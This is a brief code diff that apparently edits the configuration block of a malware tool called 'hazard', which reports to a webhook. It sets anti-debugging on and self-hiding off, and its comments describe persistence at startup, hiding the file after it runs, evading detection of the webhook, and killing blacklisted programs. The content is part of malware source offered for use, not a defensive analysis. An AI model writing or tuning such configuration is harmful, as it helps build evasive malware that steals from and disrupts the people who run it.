@@ -37,9 +37,9 @@ config = {
     # if you want the file to run at startup
     'startup': False,
     # if you want the file to hide itself after run
-    'hide_self': HIDE_FILE_STATUS,
+    'hide_self': False,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    'anti_debug': ANTI_DEBUG_STATUS,
+    'anti_debug': True,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
